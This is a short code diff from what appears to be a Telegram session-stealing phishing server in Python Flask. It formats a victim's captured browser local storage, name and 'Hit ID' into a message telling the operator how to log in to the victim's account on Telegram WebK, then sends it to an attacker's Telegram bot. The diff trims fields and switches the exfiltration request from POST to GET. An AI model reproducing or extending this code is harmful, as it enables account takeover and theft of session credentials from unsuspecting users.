@@ -105,9 +105,7 @@ def format_message(local_storage):
 
     # Format the message using HTML
     message = f"""👤 <b>Name:</b> {name}<br>
-📞 <b>Phone:</b> {phone}<br>
-🔑 <b>Password:</b> Not Used<br>
-⚙️ <b>Hit ID:</b> {hit_id}<br>
+
 ❓ <b>How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)<br><br>
 <b>Click to copy:</b> <code>{copy_code}</code>
 """
@@ -115,8 +113,7 @@ def format_message(local_storage):
 
 def send_text_to_telegram(message):
     # Send the message text to the Telegram bot using HTML parsing
-    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
-                  data={'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'})
+    requests.get(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={message}&parse_mode=HTML')
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
